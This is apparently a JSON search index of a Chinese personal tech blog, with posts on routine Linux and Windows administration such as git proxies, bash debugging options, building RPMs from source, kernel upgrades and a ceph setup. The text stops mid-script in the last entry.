[{"content":"2022年7月6日，第一次五公里 目前总跑量37公里，第一次不休息完成了5公里\n存在问题：步频较慢，心率太高\n后续计划：尝试提高步频，继续坚持5公里\n","permalink":"https://lvbibir.github.io/posts/life/running/","summary":"2022年7月6日，第一次五公里 目前总跑量37公里，第一次不休息完成了5公里 存在问题：步频较慢，心率太高 后续计划：尝试提高步频，继续坚持5公","title":"跑渣的跑步日常"},{"content":"博客流水线 修改文章原文 修改posts下文章内容 hugo -F --cleanDestinationDir rsync -avuz --progress --delete Desktop/lvbibir/2-hugo-blog/public/ root@101.201.150.47:/root/wordpress-blog/hugo-public/ 确认后git push到github做归档 seo优化 https://www.sulvblog.cn/posts/blog/hugo_seo/\n添加twikoo评论组件 基本完全按照sulv博主的文章来操作，某些地方官方有更新，不过也只是更改了页面罢了\nhttps://www.sulvblog.cn/posts/blog/hugo_twikoo/\n顺便记录一下账号关系：mongodb使用google账号登录，vercel使用github登录\n修改博客url https://gohugo.io/content-management/urls/\ntodo 修改所有文章的文件名为全英文 百度seo优化 谷歌seo优化 必应seo优化 ","permalink":"https://lvbibir.github.io/posts/blog/hello_hugo/","summary":"博客流水线 修改文章原文 修改posts下文章内容 hugo -F --cleanDestinationDir rsync -avuz --progress --delete Desktop/lvbibir/2-hugo-blog/public/ root@101.201.150.47:/root/wordpress-blog/hugo-public/ 确认后git push到github做归档 seo优化 https://www.sulvblog.cn/posts/blog/hugo_seo/ 添加twikoo评论组件","title":"【置顶】Hello,hugo!"},{"content":"前言 仅是对前端一窍不通的我的一次尝试，如果有更好的实现方法可以评论或者发邮件告诉我~\nmd文件中图片并排显示 先贴结论，并排显示图片只需要一段简单的 html 代码\n图片路径可以是网络路径，也可以是本地文件路径\n图片个数和width(宽度)按照自己需求来\n\u0026lt;center class=\u0026#34;half\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;img src=\u0026#34;图片路径\u0026#34; width=\u0026#34;194\u0026#34;/\u0026gt; \u0026lt;/center\u0026gt; 大多数情况我们使用 markdown 进行图片插入时会直接调用 markdown 语法，如下\n![图片描述](图片路径) 当需要插入多张图片时，比如手机截图，通常这种图片挨个显示未免太丑，如下\n图片实在太长，甚至一张图片都没截完，可以看到并排显示的空间利用率和美观性要比下面单张的好太多\nhugo-papermod主题中修改图片并排显示 先贴结论，按照上文中先在 post 文章中修改好图片代码，再修改站点主目录下面的 assets\\css\\core\\reset.css 文件\n修改好之后，hugo server 预览文章就可以看到图片可以并排显示了\n经测试，单张图片默认最大是792px，四张图片下，每张图片width属性最大设置为194px\nimg { /* 注释掉下面这行 display: block; */ max-width: 100%; } 下面是我误打误撞发现修改方法的过程~\n首先在typora中实现图片并排显示，百度了一下很快就找到了解决方法，但在 hugo server 预览文章时，发现图片依旧是多张图片依次显示\n这里不难想通，typora 和 hugo 对 markdown 中图片的渲染可能有所区别\n接下来使用 chrome 的开发者工具，尝试找到蛛丝马迹（之前最多用开发者工具看一下是否有报错，什么资源请求失败什么的~）\n这里先是通过选取界面元素进行检查，看到了第三列的样式，而且这些样式或者说属性是可以点选的！\n于是我就随便点了点，当把 img-display 这个样式前面的对钩去掉后，惊讶的发现，图片可以并排显示了！\\(^o^)/\n到这里问题基本就解决了，先是尝试找请求的这个css文件，发现在 hugo 编译时生成的 public 下，没什么意义，通过 vscode 的全局查找，找到了 assets\\css\\core\\reset.css 文件，注释掉 display: block 后，图片就可以正常并排显示了。\n","permalink":"https://lvbibir.github.io/posts/blog/hugo_image_layout/","summary":"前言 仅是对前端一窍不通的我的一次尝试，如果有更好的实现方法可以评论或者发邮件告诉我~ md文件中图片并排显示 先贴结论，并排显示图片只需要一段简","title":"修改hugo的图片布局，使多张图片可以并排显示"},{"content":"# 设置全局代理 # http git config --global https.proxy http://127.0.0.1:1080 # https git config --global https.proxy https://127.0.0.1:1080 # 使用socks5代理的 例如ss，ssr 1080是windows下ss的默认代理端口,mac下不同，或者有自定义的，根据自己的改 git config --global http.proxy socks5://127.0.0.1:1080 git config --global https.proxy socks5://127.0.0.1:1080 # 只对github.com使用代理，其他仓库不走代理 git config --global http.https://github.com.proxy socks5://127.0.0.1:1080 git config --global https.https://github.com.proxy socks5://127.0.0.1:1080 # 取消github代理 git config --global --unset http.https://github.com.proxy git config --global --unset https.https://github.com.proxy # 取消全局代理 git config --global --unset http.proxy git config --global --unset https.proxy ","permalink":"https://lvbibir.github.io/posts/tech/git_set_proxy/","summary":"# 设置全局代理 # http git config --global https.proxy http://127.0.0.1:1080 # https git config --global https.proxy https://127.0.0.1:1080 # 使用socks5代理的 例如ss，ssr 1080是windows下ss的默认代理端口,mac下不同","title":"git设置代理"},{"content":"添加节点 管理防火墙及selinux\n安装docker-ce\n提前下载docker镜像\n修改网卡名称\n修改主机名\n配置ssh免密\nkolla-ansible -i ./multinode bootstrap-servers --limit node135 kolla-ansible -i ./multinode prechecks --limit node135 kolla-ansible -i ./multinode deploy --limit node135 参考 https://blog.csdn.net/qq_33316576/article/details/107457111\nhttps://blog.csdn.net/networken/article/details/106745167\n","permalink":"https://lvbibir.github.io/posts/tech/kolla-ansible_deploy_multinode_train/","summary":"添加节点 管理防火墙及selinux 安装docker-ce 提前下载docker镜像 修改网卡名称 修改主机名 配置ssh免密 kolla-ansible -i ./multinode bootstrap-servers --limit node135 kolla-ansible -i ./multinode prechecks --limit node135","title":"kolla-ansible部署多节点openstack（Train版）"},{"content":"shell 脚本通常有 sh filename、bash filename、./filename、source filename 这四种执行方式\nsource filename 可以使用 . filename 代替，在当前的 bash 环境下读取并执行脚本文件中的命令，且脚本文件文件的变量，在脚本执行完成后会保存下来 ./filename 和 sh filename 或者 bash filename 是等效的，都是开启一个子shell来运行脚本文件，脚本中设置的变量执行完毕后不会保存 除./filename 外，source filename 、. filename 、sh filename 、bash filename 都是不需要执行权限的\n变量和权限问题示例\n# 设置临时变量，仅在当前 bash 环境生效 [root@lvbibir ~]# name=lvbibir [root@lvbibir ~]# echo $name lvbibir [root@lvbibir ~]# [root@lvbibir ~]# cat test.sh #!/bin/bash echo $name # source 或者 . 可以获取到父 bash 环境的变量 [root@lvbibir ~]# source test.sh lvbibir [root@lvbibir ~]# . test.sh lvbibir # sh、bash、./三种方式都使用了子 bash 环境，所以无法获取父 bash 环境的变量 # ./ 方式需要脚本有执行权限 [root@lvbibir ~]# sh test.sh [root@lvbibir ~]# bash test.sh [root@lvbibir ~]# ./test.sh -bash: ./test.sh: Permission denied [root@lvbibir ~]# chmod a+x test.sh [root@lvbibir ~]# ./test.sh 同理，使用 source 或者 . 也可以在 bash 环境中获取到脚本中设置的变量\n[root@lvbibir ~]# cat \u0026gt; test.sh \u0026lt;\u0026lt; EOF \u0026gt; #!/bin/bash \u0026gt; number=22 \u0026gt; \u0026gt; EOF [root@lvbibir ~]# echo $number # sh bash ./ 三种方式无法获取脚本中的变量 [root@lvbibir ~]# [root@lvbibir ~]# sh test.sh [root@lvbibir ~]# echo $number [root@lvbibir ~]# bash test.sh [root@lvbibir ~]# echo $number [root@lvbibir ~]# ./test.sh [root@lvbibir ~]# echo $number # source 方式可以获取脚本中的变量 [root@lvbibir ~]# source test.sh [root@lvbibir ~]# echo $number 22 [root@lvbibir ~]# 其他问题 关于是否在子 bash 环境运行的区别出了变量问题还会存在一些其他影响，如下测试\n已知目前存在一个 mysqld 进程，其 pid 为 29426 ，写一个监控pid的脚本\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | awk \u0026#39;{print $4}\u0026#39;) echo $pid 两种方式分别运行一下\n[root@lvbibir ~]# sh test.sh mysqld 27038 27039 29426 [root@lvbibir ~]# bash test.sh mysqld 27047 27048 29426 [root@lvbibir ~]# ./test.sh mysqld 27056 27057 29426 [root@lvbibir ~]# [root@lvbibir ~]# source test.sh mysqld 29426 [root@lvbibir ~]# . test.sh mysqld 29426 [root@lvbibir ~]# 问题出现了，由于某种原因导致子 bash 环境中执行的脚本监控到多个 pid ，给脚本添加个 sleep 来看下\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | awk \u0026#39;{print $4}\u0026#39;) echo $pid sleep 30 [root@lvbibir ~]# ./test.sh mysqld 27396 27397 29426 新开一个终端，查看进程\n输出的第一个进程号和第三个进程号对上了，第二个目前不知道是怎么产生的\n在脚本再添加个 grep 过滤掉脚本本身的进程来规避这个问题\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | grep -v bash | awk \u0026#39;{print $4}\u0026#39;) echo $pid [root@lvbibir ~]# ./test.sh mysqld 29426 参考 https://blog.csdn.net/houxiaoni01/article/details/105161356\n","permalink":"https://lvbibir.github.io/posts/tech/shell_different_execution_mode/","summary":"shell 脚本通常有 sh filename、bash filename、./filename、source filename 这四种执行方式 source filename 可以使用 . filename 代替，在当前的 bash","title":"shell脚本不同执行方式的区别"},{"content":"前言 bash脚本是没有debug模式的，不过可以通过 set 指令实现简单的debug功能\nbash 脚本中默认每条指令都会从上到下依次执行，但是当某行指令报错时，我们大多数情况下是不希望继续执行后续指令的\n这时可以使用 bash 脚本中 set 指令的四个参数：``-e、-u、-x、-o pipefail`\n命令报错即返回值（$?）不为0\nset -e set -e 选项可以在脚本出现异常的时候立即退出，后续命令不再执行，相当于打上了一个断点\nif 判断条件里出现异常也会直接退出，如果不希望退出可以在判断语句后面加上 || true 来阻止退出\nbefore 脚本内容\nfoo是一个不存在的命令，用于模拟命令报错\n#!/bin/bash foo echo \u0026#34;hello\u0026#34; 执行结果\n./test.sh: line 3: foo: command not found hello after 脚本内容\n#!/bin/bash set -e foo echo \u0026#34;hello\u0026#34; 执行结果\n./test.sh: line 5: foo: command not found 阻止立即退出的例子 #!/bin/bash set -e foo || true echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found hello set -o pipefail 默认情况下 bash 只会检查管道（pipelie）操作的最后一个命令的返回值，即最后一个命令返回值为 0 则判断整条管道语句是正确的\n如下\nset -o pipefail 的作用就是管道中只要有一个命令失败，则整个管道视为失败\nbefore #!/bin/bash set -e foo | echo \u0026#34;a\u0026#34; echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found a hello after #!/bin/bash set -eo pipefail foo | echo \u0026#34;a\u0026#34; echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found a set -u set -u 的作用是将所有未定义的变量视为错误，默认情况下 bash 会将未定义的变量视为空\nbefore #!/bin/bash set -eo pipefail echo $a echo \u0026#34;hello\u0026#34; hello after #!/bin/bash set -euo pipefail echo $a echo \u0026#34;hello\u0026#34; ./test.sh: line 5: a: unbound variable set -x set -x 可以让 bash 把每个命令在执行前先打印出来，好处显而易见，可以快速方便的找到出问题的脚本位置，坏处就是 bash 的 log 会格外的乱\n另外，它在打印的时候会先把变量解析出来\n纵然 log 可能会乱一些，但也比debug的时候掉头发强\n#!/bin/bash set -euox pipefail a=2 echo $a echo \u0026#34;hello\u0026#34; + a=2 + echo 2 # 这里已经将变量 a 解析为 2 了 2 + echo hello hello 参考 https://zhuanlan.zhihu.com/p/107135290\n","permalink":"https://lvbibir.github.io/posts/tech/shell_enable_debug_mode/","summary":"前言 bash脚本是没有debug模式的，不过可以通过 set 指令实现简单的debug功能 bash 脚本中默认每条指令都会从上到下依次执行，但是当某行指令报","title":"shell脚本开启debug模式"},{"content":"前言 仅在win10测试可用\n在工作中需要连接公司内网（有线，不可联网），访问外网时需要连接无线\n同时接入这两个网络时，内网访问正常，外网无法访问。\n此时可以通过调整网络优先级及配置路由实现内外网同时访问\n一般来说，内网的网段数量较少，我们可以配置使默认路由走外网，走内网时通过配置的路由走\n调整网络优先级 查看默认路由\nroute print 0.0.0.0 这两个路由分别是内网和外网的默认路由，绝大部分情况网络都是走的默认路由，但这里有两条默认路由，默认路由的优先级是按照跃点数的多少决定的，跃点数越少，优先级越高\n通过tracert命令测试下\n此时访问外网默认走内网网卡，自然是不通的。\n将外网无线的跃点数调小点再试试\nroute print可以看到跃点数修改成功了，此时外网无线的跃点数更小，优先级更高\ntracert\u0026amp;ping再试一下\n配置路由 配置路由需要以管理员权限运行powershell或者cmd\n配置路由后，内网访问也没有问题了\nroute add 172.16.2.0 mask 255.255.255.0 172.30.4.254 metric 3 route add 172.16.3.0 mask 255.255.255.0 172.30.4.254 metric 3 route add 172.16.4.0 mask 255.255.255.0 172.30.4.254 metric 3 这里配置的路由重启系统后会消失，加 -p选项设置为永久路由\nroute add -p 172.16.2.0 mask 255.255.255.0 172.30.4.254 metric 3 ","permalink":"https://lvbibir.github.io/posts/tech/windows_network_priority/","summary":"前言 仅在win10测试可用 在工作中需要连接公司内网（有线，不可联网），访问外网时需要连接无线 同时接入这两个网络时，内网访问正常，外网无法访问","title":"windows双网卡时设置网络优先级"},{"content":"系统版本：isoft-serveros-v4.2（centos7）\n源码下载链接：\nhttps://dlcdn.apache.org//apr/apr-1.7.0.tar.bz2\nhttps://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2\nhttps://dlcdn.apache.org//httpd/httpd-2.4.52.tar.bz2\n安装依赖\nyum install -y wget gcc rpm-build yum install -y autoconf zlib-devel libselinux-devel libuuid-devel apr-devel apr-util-devel pcre-devel openldap-devel lua-devel libxml2-devel openssl-devel yum install -y libtool doxygen yum install -y postgresql-devel mysql-devel sqlite-devel unixODBC-devel nss-devel libdb4-devel依赖需要使用epel源安装，这里使用阿里的epel源\n# 添加阿里yum源 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 手动修改repo文件中的系统版本，因为本系统检测到的版本号是4 sed -i \u0026#39;s/$releasever/7/g\u0026#39; /etc/yum.repos.d/CentOS-Base.repo # 安装epel源 yum install -y epel-release # 安装libdb4-devel yum install -y libdb4-devel 编译准备\n[root@localhost ~]# mkdir -p /root/rpmbuild/{SPECS,SOURCES} [root@localhost ~]# cd /root/rpmbuild/SOURCES/ [root@localhost SOURCES]# wget --no-check-certificate https://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2 [root@localhost SOURCES]# tar jxf apr-1.7.0.tar.bz2 [root@localhost SOURCES]# tar jxf apr-util-1.6.1.tar.bz2 [root@localhost SOURCES]# tar jxf httpd-2.4.52.tar.bz2 [root@localhost SOURCES]# cp apr-1.7.0/apr.spec ../SPECS/ [root@localhost SOURCES]# cp apr-util-1.6.1/apr-util.spec ../SPECS/ [root@localhost SOURCES]# cp httpd-2.4.52/httpd.spec ../SPECS/ 开始编译\n[root@localhost SOURCES]# cd ../SPECS/ # 修改spec文件 [root@localhost SPECS]# vim apr.spec Release: 1%dist [root@localhost SPECS]# vim apr-util.spec Release: 1%dist [root@localhost SPECS]# vim httpd.spec Release: 1%dist [root@localhost SPECS]# rpmbuild -ba apr.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/apr-* [root@localhost SPECS]# rpmbuild -ba apr-util.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/apr-util-* [root@localhost SPECS]# rpmbuild -ba httpd.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/httpd-* [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/mod_* # 打包所有的软件包 [root@localhost ~]# tar zcf httpd-2.4.25.tar.gz x86_64/ 这里修改%dist是为了修改编译后生成的软件包的名字，dist具体代表什么可以在/etc/rpm/macros.dist文件中看到\n","permalink":"https://lvbibir.github.io/posts/tech/httpd_src_build_rpm/","summary":"系统版本：isoft-serveros-v4.2（centos7） 源码下载链接： https://dlcdn.apache.org//apr/apr-1.7.0.tar.bz2 https://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2 https://dlcdn.apache.org//httpd/httpd-2.4.52.tar.bz2 安装依赖 yum install -y wget gcc rpm-build yum install -y autoconf zlib-devel libselinux-devel libuuid-devel apr-devel apr-util-devel pcre-devel openldap-devel lua-devel libxml2-devel openssl-devel yum install -y","title":"httpd源码构建rpm"},{"content":"环境 iSoftserver-v4.2(Centos-7)\nopenssl version：1.0.2k\n编译 从github上看到的编译脚本，本地修改后：\n#!/bin/bash set -e set -v mkdir ~/openssl \u0026amp;\u0026amp; cd ~/openssl yum -y install \\ curl \\ which \\ make \\ gcc \\ perl \\ perl-WWW-Curl \\ rpm-build # Get openssl tarball cp /root/openssl-1.1.1m.tar.gz ./ # SPEC file cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; \u0026gt; ~/openssl/openssl.spec Summary: OpenSSL 1.1.1m for Centos Name: openssl Version: %{?version}%{!?version:1.1.1m} Release: 1%{?dist} Obsoletes: %{name} \u0026lt;= %{version} Provides: %{name} = %{version} URL: https://www.openssl.org/ License: GPLv2+ Source: https://www.openssl.org/source/%{name}-%{version}.tar.gz BuildRequires: make gcc perl perl-WWW-Curl BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-root %global openssldir /usr/openssl %description OpenSSL RPM for version 1.1.1m on Centos %package devel Summary: Development files for programs which will use the openssl library Group: Development/Libraries Requires: %{name} = %{version}-%{release} %description devel OpenSSL RPM for version 1.1.1m on Centos (development package) %prep %setup -q %build ./config --prefix=%{openssldir} --openssldir=%{openssldir} make %install [ \u0026#34;%{buildroot}\u0026#34; != \u0026#34;/\u0026#34; ] \u0026amp;\u0026amp; %{__rm} -rf %{buildroot} %make_install mkdir -p %{buildroot}%{_bindir} mkdir -p %{buildroot}%{_libdir} ln -sf %{openssldir}/lib/libssl.so.1.1 %{buildroot}%{_libdir} ln -sf %{openssldir}/lib/libcrypto.so.1.1 %{buildroot}%{_libdir} ln -sf %{openssldir}/bin/openssl %{buildroot}%{_bindir} %clean [ \u0026#34;%{buildroot}\u0026#34; != \u0026#34;/\u0026#34; ] \u0026amp;\u0026amp; %{__rm} -rf %{buildroot} %files %{openssldir} %defattr(-,root,root) /usr/bin/openssl /usr/lib64/libcrypto.so.1.1 /usr/lib64/libssl.so.1.1 %files devel %{openssldir}/include/* %defattr(-,root,root) %post -p /sbin/ldconfig %postun -p /sbin/ldconfig EOF mkdir -p /root/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS} cp ~/openssl/openssl.spec /root/rpmbuild/SPECS/openssl.spec mv openssl-1.1.1m.tar.gz /root/rpmbuild/SOURCES cd /root/rpmbuild/SPECS \u0026amp;\u0026amp; \\ rpmbuild \\ -D \u0026#34;version 1.1.1m\u0026#34; \\ -ba openssl.spec # Before Uninstall Openssl : rpm -qa openssl # Uninstall Current Openssl Vesion : yum -y remove openssl # For install: rpm -ivvh /root/rpmbuild/RPMS/x86_64/openssl-1.1.1m-1.el7.x86_64.rpm --nodeps # Verify install: rpm -qa openssl # openssl version 运行脚本\nchmod 755 install_openssl-1.1.1m.sh ./isntall_openssl-1.1.1m.sh tree rpmbuild/*RPMS 升级 rpm -e openssl --nodeps rpm -ivh openssl-1.1.1m-1.el7.isoft.x86_64.rpm --nodeps openssl version ","permalink":"https://lvbibir.github.io/posts/tech/openssl_src_build_rpm/","summary":"环境 iSoftserver-v4.2(Centos-7) openssl version：1.0.2k 编译 从github上看到的编译脚本，本地修改后： #!/bin/bash set -e set -v mkdir ~/openssl \u0026amp;\u0026amp; cd ~/openssl yum -y install \\ curl \\ which \\ make \\ gcc \\ perl \\ perl-WWW-Curl \\ rpm-build #","title":"openssl源码构建rpm"},{"content":"前言 在使用kolla-ansible部署多节点openstack时，所有节点的外网网卡名称和管理网卡名称需要一样，其中两台是型号相同的物理机，网卡名无需变动，第三台是虚拟机，默认是ens*形式的网卡，需要改成enp*s*f*的格式\n修改配置文件 vim /etc/sysconfig/network-scripts/ifcfg-ens32 配置网络规则命名文件 vim /etc/udev/rules.d/70-persistent-ipoib.rules # 添加如下行，mac地址自行修改 SUBSYSTEM==\u0026#34;net\u0026#34;, ACTION==\u0026#34;add\u0026#34;, DRIVERS==\u0026#34;?*\u0026#34;, ATTR{address}==\u0026#34;00:0c:29:bc:1e:01\u0026#34;, ATTR{type}==\u0026#34;1\u0026#34;, KERNEL==\u0026#34;eth*\u0026#34;, NAME=\u0026#34;enp11s0f0\u0026#34; 配置grub并重启 vim /etc/default/grub # 修改如下行 GRUB_CMDLINE_LINUX=\u0026#34;crashkernel=auto rd.lvm.lv=centos/root net.ifnames=0 rd.lvm.lv=centos/swap rhgb quiet\u0026#34; grub2-mkconfig -o /boot/grub2/grub.cfg 之后直接reboot重启系统\n参考 https://www.xmodulo.com/change-network-interface-name-centos7.html\n","permalink":"https://lvbibir.github.io/posts/tech/centos7_change_network_card_name/","summary":"前言 在使用kolla-ansible部署多节点openstack时，所有节点的外网网卡名称和管理网卡名称需要一样，其中两台是型号相同的物理机","title":"centos7修改网卡名称"},{"content":"pg_num 用此命令创建存储池时：\nceph osd pool create {pool-name} pg_num 确定pg_num取值是强制性的，因为不能自动计算。常用的较为通用的取值：\n少于5个osd，pg_num设置为128 osd数量在 5 到 10 个时，pg_num设置为512 osd数量在 10 到 50 个时，pg_num = 4096 osd数量大于50是，需要理解ceph的权衡算法，自己计算pg_num取值 自行计算pg_num取值时可使用ceph配套的pg_num取值工具 pgcalc（https://old.ceph.com/pgcalc/） 参考 https://www.cnblogs.com/varden/p/13921172.html\n","permalink":"https://lvbibir.github.io/posts/tech/ceph_pg_num_config_create_pool/","summary":"pg_num 用此命令创建存储池时： ceph osd pool create {pool-name} pg_num 确定pg_num取值是强制性的，因为不能自动计算。常用的较为通用的取值： 少于5个osd，pg_num设置","title":"ceph创建pool时pg_num的配置"},{"content":"python方式 批量导出，运行后所有tar包都在当前目录下\n# encoding: utf-8 import re import os import subprocess if __name__ == \u0026#34;__main__\u0026#34;: p = subprocess.Popen(\u0026#39;docker images\u0026#39;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) for line in p.stdout.readlines(): # 此处的正则表达式是为了匹配镜像名以kolla为开头的镜像 # 实际使用中根据需要自行调整 m = re.match(r\u0026#39;(^kolla[^\\s]*\\s*)\\s([^\\s]*\\s)\u0026#39;, line) if not m: continue # 镜像名 iname = m.group(1).strip() # tag itag = m.group(2).strip() # tar包的名字 if iname.find(\u0026#39;/\u0026#39;): tarname = iname.split(\u0026#39;/\u0026#39;)[0] + \u0026#39;_\u0026#39; + iname.split(\u0026#39;/\u0026#39;)[-1] + \u0026#39;_\u0026#39; + itag + \u0026#39;.tar\u0026#39; else: tarname = iname + \u0026#39;_\u0026#39; + itag + \u0026#39;.tar\u0026#39; print tarname ifull = iname + \u0026#39;:\u0026#39; + itag #save cmd = \u0026#39;docker save -o \u0026#39; + tarname + \u0026#39; \u0026#39; + ifull print os.system(cmd) retval = p.wait() 批量导入，同理导入当前目录下的所有的tar包\nimport os images = os.listdir(os.getcwd()) for imagename in images: if imagename.endswith(\u0026#39;.tar\u0026#39;): print(imagename) os.system(\u0026#39;docker load -i %s\u0026#39;%imagename) bash方式 导出 #!/bin/bash docker images \u0026gt; images.txt awk \u0026#39;{print $1}\u0026#39; images.txt \u0026gt; images_cut.txt sed -i \u0026#39;1d\u0026#39; images_cut.txt while read LINE do docker save $LINE \u0026gt; ${LINE//\\//_}.train.tar echo ok done \u0026lt; images_cut.txt echo finish 导入 #!/bin/bash while read LINE do docker load -i $LINE echo ok done \u0026lt; tarname.txt echo finish 参考 https://www.cnblogs.com/ksir16/p/8865525.html\n","permalink":"https://lvbibir.github.io/posts/tech/import_export_docker_image/","summary":"python方式 批量导出，运行后所有tar包都在当前目录下 # encoding: utf-8 import re import os import subprocess if __name__ == \u0026#34;__main__\u0026#34;: p = subprocess.Popen(\u0026#39;docker images\u0026#39;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) for line in p.stdout.readlines(): # 此处的正则表达式是为了匹配镜像名","title":"批量导出\u0026导入docker镜像"},{"content":"查看内核版本\n[dpl@test1 ~]$ cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.5 (Maipo)\n下载内核\nhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/ 下载自己所需的内核 更新版本：5.10.81\n内核版本介绍：\nlt longterm的缩写 长期维护版 ml mainline的缩写 最新稳定版 使用wget命令下载内核RPM包\n[dpl@test1 ~]# wget https://dl.lamp.sh/kernel/el7/kernel-ml-5.10.81-1.el7.x86_64.rpm [dpl@test1 ~]# wget https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.10.81-1.el7.x86_64.rpm 安装内核\nyum localinstall -y kernel-ml-5.10.81-1.el7.x86_64.rpm kernel-ml-devel-5.10.81-1.el7.x86_64.rpm 查看所有可用内核启动项\n[dpl@test1 ~] awk -F' \u0026lsquo;$1==\u0026ldquo;menuentry \u0026quot; {print i++ \u0026quot; : \u0026quot; $2}\u0026rsquo; /etc/grub2.cfg 0 : CentOS Linux (5.10.81-1.el7.x86_64) 7 (Core) 1 : CentOS Linux (3.10.0-1160.21.1.el7.x86_64) 7 (Core) 2 : CentOS Linux (3.10.0-957.el7.x86_64) 7 (Core) 3 : CentOS Linux (0-rescue-9a4efd5deb094f5d8a9a259066ff4f3d) 7 (Core)\n记下5.11.9内核前面的序号，修改启动项需要\n修改默认启动项\n默认启动项由/etc/default/grub中的GRUB_DEFAULT控制，如果GRUB_DEFAULT=saved，则该参数将存在/boot/grub2/grubenv\n输入grub2-editenv list命令查看默认启动项\n[root@localhost ~]# grub2-editenv list saved_entry=CentOS Linux (3.10.0-1060.el7.x86_64) 7 (Core)\n输入grub2-set-default命令修改默认启动项，0表示5.11.9内核的序号\n[dpl@test1 ~]# grub2-set-default 0\n再次查看默认启动项，发现默认启动项已经改成了0\n10.81-1.el7.elrepo.x86_64\n[dpl@test1 ~]# uname -r 5.10.81-1.el7.elrepo.x86_64\n参考：https://blog.csdn.net/cqchengdan/article/details/106031823\n","permalink":"https://lvbibir.github.io/posts/tech/centos7_update_kernel_to_5.10/","summary":"查看内核版本 [dpl@test1 ~]$ cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.5 (Maipo) 下载内核 https://elrepo.org/linux/kernel/el7/x86_64/RPMS/ 下载自己所需的内核 更新版本：5.10.81 内核版本介绍： lt longterm的缩写 长期维护版 ml m","title":"Centos7.5升级内核至5.10"},{"content":"pam模块 pam：Pluggable Authentication Modules 可插拔的认证模块，linux 中的认证方式，“可插拔的“说明可以按需对认证内容进行变更。与nsswitch一样，也是一个通用框架。只不过是提供认证功能的。\n重置密码失败次数 pam_tally2 -r -u root ## 或者 ## faillock --user root --reset 具体取决于在规则文件中使用的是 pam_faillock.so 模块还是 pam_tally2.so 模块\n例：\nvim /etc/pam.d/system-auth ","permalink":"https://lvbibir.github.io/posts/tech/centos_too_many_password_attempts/","summary":"pam模块 pam：Pluggable Authentication Modules 可插拔的认证模块，linux 中的认证方式，“可插拔的“说明可以按需对认证内容进行变更。与nsswit","title":"CentOS密码尝试次数过多"},{"content":"前言 基于CVE-1999-0526漏洞的披露，对系统X服务的6000端口进行关闭\n有三种方式：\n修改系统/usr/bin/X内容，增加nolisten参数 开启系统防火墙，关闭6000端口的对外访问 禁用桌面(runlevel-5)，开机进入字符界面(runlevel-3) 修改/usr/bin/X脚本 关闭 rm -f /usr/bin/X vim /usr/bin/X ################### 添加如下内容 #!/bin/bash exec /usr/bin/Xorg \u0026#34;$@\u0026#34; -nolisten tcp exit 0 #################### chmod 777 /usr/bin/X kill -9 进程号 # ps -elf |grep X 显示的进程号 恢复 rm -f /usr/bin/X ln -s /usr/bin/Xorg /usr/bin/X kill -9 进程号 # pe -elf | grep Xorg 显示的进程号 在测试过程中出现过杀死X服务进程后没有自启的情况，可尝试使用 init 3 \u0026amp;\u0026amp; init 5 尝试重新启动X服务\n修改防火墙方式 # 开启除6000端口以外的所有端口(6000端口无法访问) systemctl start firewalld firewall-cmd --permanent --zone=public --add-port=1-65535/udp firewall-cmd --permanent --zone=public --add-port=1-5999/tcp firewall-cmd --permanent --zone=public --add-port=6001-65535/tcp firewall-cmd --reload firewall-cmd --list-all # 恢复（6000端口可以访问） firewall-cmd --permanent --zone=public --add-port=6000/tcp firewall-cmd --reload firewall-cmd --list-all 参考 https://bugzilla.redhat.com/show_bug.cgi?id=1647621\n","permalink":"https://lvbibir.github.io/posts/tech/close_6000_port/","summary":"前言 基于CVE-1999-0526漏洞的披露，对系统X服务的6000端口进行关闭 有三种方式： 修改系统/usr/bin/X内容，增加nolis","title":"关闭X服务本地监听的6000端口"},{"content":"前言 ceph测试环境的搭建\n基本环境 物理环境：Vmware Workstaion 系统版本：Centos-7.9-Minimal 两个osd节点添加一块虚拟磁盘，建议不小于20G ip hostname services 192.168.150.101 ceph-admin(ceph-deploy) mds1、mon1、mon_mgr、ntp-server 192.168.150.102 ceph-node1 osd1 192.168.150.103 ceph-node2 osd2 前期配置 以下操作所有节点都需执行\n修改主机名\nhostnamectl set-hostname ceph-admin bash hostnamectl set-hostname ceph-node1 bash hostnamectl set-hostname ceph-node2 bash 修改hosts文件\nvim /etc/hosts 192.168.150.101 ceph-admin 192.168.150.102 ceph-node1 192.168.150.103 ceph-node2 关闭防火墙和selinux、修改yum源及安装一些常用工具\n这里提供了一个简单的系统初始化脚本用来做上述操作，适用于Centos7\nchmod 777 init.sh ./init.sh #!/bin/bash echo \u0026#34;========start=============\u0026#34; sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/sysconfig/selinux setenforce 0 iptables -F systemctl disable 